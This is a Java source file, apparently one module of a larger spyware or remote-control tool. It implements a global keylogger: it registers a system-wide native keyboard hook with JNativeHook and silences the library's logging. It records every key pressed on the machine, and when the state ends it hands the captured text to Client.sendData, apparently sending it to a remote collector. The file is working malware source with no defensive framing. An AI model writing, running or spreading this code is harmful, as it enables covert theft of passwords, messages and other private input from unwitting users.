
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Listen extends State implements NativeKeyListener {

    private String typed;

    public Listen(Context context)  {
        super(context);
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);
        logger.setUseParentHandlers(false);
        typed= "";
        doAction();
    }




    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        typed += NativeKeyEvent.getKeyText(e.getKeyCode());
        System.out.println(typed);
    }


    @Override
    void doAction() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(this);
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    @Override
    public void end() throws IOException {
        result.put(0,typed.getBytes());
        typed="";
        Client.sendData(result);

    }
}
